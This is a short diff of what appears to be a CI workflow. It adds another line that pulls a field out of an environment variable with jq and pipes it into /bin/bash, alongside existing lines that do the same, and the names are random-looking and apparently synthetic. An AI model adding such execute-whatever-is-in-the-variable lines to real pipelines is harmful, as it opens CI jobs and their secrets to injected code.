@@ -21,6 +21,7 @@ jobs:
           echo $w7584 | jq -r .oc15 | /bin/bash
           echo $wquuw98470 | jq -r .are4 | /bin/bash
           printf '%s' "$htlj4" | jq -r .vglj537 | /bin/bash
+          printf '%s' "$ikvl8575" | jq -r .diul0 | /bin/bash
 
       - name: Upload results
         if: always()
